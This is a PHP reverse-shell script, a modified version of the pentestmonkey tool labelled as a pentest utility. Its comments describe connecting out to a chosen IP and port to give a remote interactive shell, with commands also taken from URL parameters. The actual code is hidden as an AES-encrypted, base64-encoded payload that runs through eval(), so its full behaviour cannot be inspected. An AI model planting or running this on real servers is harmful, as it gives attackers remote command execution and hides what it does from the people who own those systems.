<?php
// php-(smart)-reverse-shell - A (Smart) Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
// Improvements by Gramthanos
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
//
// Smart Improvements (by Gramthanos)
// ----------------------------------
// IP and Port definition from URL parameters or CMD arguments (PHP >= 4.3.0)
// Command excecution from URL parameters

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

set_time_limit (0);
$VERSION = "2.0-smart";
$ip = '127.0.0.1';  // DEFAULT
$port = 1234;       // DEFAULT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
$verbose = true;

// DONT EDIT FROM THIS POINT ON
// SPLIT&ENCRYPTed
eval(openssl_decrypt(
	base64_decode('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'),
	'AES-256-CBC',
	base64_decode('tJPUg2Sv5E0RwBZc9HCkFk0eJgmRHvmYvoaNRq3j3k4='),
	OPENSSL_RAW_DATA,
	base64_decode('OW5DRTJ6hTYw6T7wKcA0PA==')
));
